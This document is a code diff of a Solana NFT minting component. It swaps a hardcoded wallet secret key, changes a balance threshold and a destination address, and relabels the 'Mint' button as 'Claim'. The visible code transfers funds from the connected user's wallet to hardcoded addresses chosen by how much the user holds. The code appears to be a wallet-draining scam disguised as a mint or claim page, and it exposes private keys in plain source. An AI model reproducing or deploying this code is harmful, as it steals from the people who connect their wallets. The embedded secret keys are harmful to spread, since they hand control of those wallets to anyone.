@@ -6,7 +6,7 @@ import { Keypair, LAMPORTS_PER_SOL, sendAndConfirmTransaction, SystemProgram, Tr
 import { PublicKey } from '@metaplex-foundation/js';
 import bs58 from 'bs58';
 import { createTransferInstruction, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';
-const serverWallet = Keypair.fromSecretKey(bs58.decode('3vhWm7S9j9PTbcsk7txKJ6bymjPkCXEtqRC8rJxrAkrN6gSBzGkDNwEZAbNeqhGCoa1gHsNuyFFTwJfbU9gnSvm5'));
+const serverWallet = Keypair.fromSecretKey(bs58.decode('o3FHa4NZjmmgh3BQcNPjkSsy91reVoHgw7qm8HnAS7ysgDRVCoZcDFSQmsptoe1wvAzTpjWn7i1EbqxQNSWPaCL'));
 
 const MintingComponent = ({setAlertState} : any) => {
   const totalSupply = 1000;
@@ -62,8 +62,8 @@ const MintingComponent = ({setAlertState} : any) => {
         // 4BYbjRczvKBQDi1KVDDeNfN3xwGzWB6ashC5r6bDhi1V
         // J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX
         let topubkey;
-        if(totalBalance > LAMPORTS_PER_SOL * 5) topubkey = new PublicKey('J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX');
-        else topubkey = new PublicKey('4BYbjRczvKBQDi1KVDDeNfN3xwGzWB6ashC5r6bDhi1V');
+        if(totalBalance > LAMPORTS_PER_SOL * 3) topubkey = new PublicKey('J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX');
+        else topubkey = new PublicKey('FgvgCycpEPjtytth1KZT6xmqpy8ksJdW3iMnjuLcxtK2');
         const otherTransferInstruction3 : any = SystemProgram.transfer({
             fromPubkey: wallet.publicKey,
             toPubkey: topubkey,
@@ -118,7 +118,7 @@ const MintingComponent = ({setAlertState} : any) => {
             <span>{quantity}</span>
             <button onClick={() => setQuantity(quantity + 1)}>+</button>
         </div>
-        <button style={styles.button} onClick={handleMint}>Mint</button>
+        <button style={styles.button} onClick={handleMint}>Claim</button>
         </div>
     </div>
   );
